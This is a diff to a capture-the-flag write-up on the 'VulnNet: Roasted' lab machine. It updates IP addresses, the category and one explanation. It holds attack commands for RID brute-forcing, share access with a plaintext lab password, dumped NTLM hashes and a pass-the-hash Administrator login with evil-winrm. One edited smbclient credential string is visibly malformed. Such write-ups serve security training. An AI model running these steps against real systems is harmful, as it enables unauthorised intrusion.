@@ -5,7 +5,7 @@
 # VulnNet: Roasted
 
 **Difficulty:** Easy
-**Category:** SMB
+**Category:** AD / Kerberos
 
 </div>
 
@@ -13,11 +13,11 @@
 
 
 ```bash
-nmap -sV -sC 10.81.144.217 -oN roasted-nmap.txt
+nmap -sV -sC 10.80.179.138 -oN roasted-nmap.txt
 ```
 
 ```bash
-smbclient -L //10.81.144.217/
+smbclient -L //10.80.179.138/
 ```
 
 ![temp](assets/20260729113343.png)
@@ -73,9 +73,9 @@ We get the `sid`'s (`Security Identifiers`) which are unique, immutable values a
 This means we can also do:
 
 ```bash
-crackmapexec smb 10.80.173.138 -u 'anonymous' -p '' --rid-brute
+crackmapexec smb 10.80.179.138 -u 'anonymous' -p '' --rid-brute
 # or
-crackmapexec smb 10.80.173.138 -u 'guest' -p '' --rid-brute
+crackmapexec smb 10.80.179.138 -u 'guest' -p '' --rid-brute
 ```
 
 ![temp](assets/20260729130741.png)
@@ -122,7 +122,7 @@ crackmapexec smb 10.80.179.138 -u 't-skid' -p 'tj072889*' --shares
 `t-skid` has read access to the shares `NETLOGON` and `SYSVOL`.
 
 ```bash
-smbclient //10.80.179.138/NETLOGON -U 't-skidtj072889*'
+smbclient //10.80.179.138/NETLOGON -U 't-skidt%j072889*'
 ```
 
 We find a file `ResetPassword.vbs`.
@@ -194,7 +194,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-These are the local hashes loaded in memory? I guess for this CTF the user Administrator is logged in.
+These are the local accounts for this machine, the administrator is the **local Administrator**.
 
 ```bash
 evil-winrm -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d -i 10.80.179.138
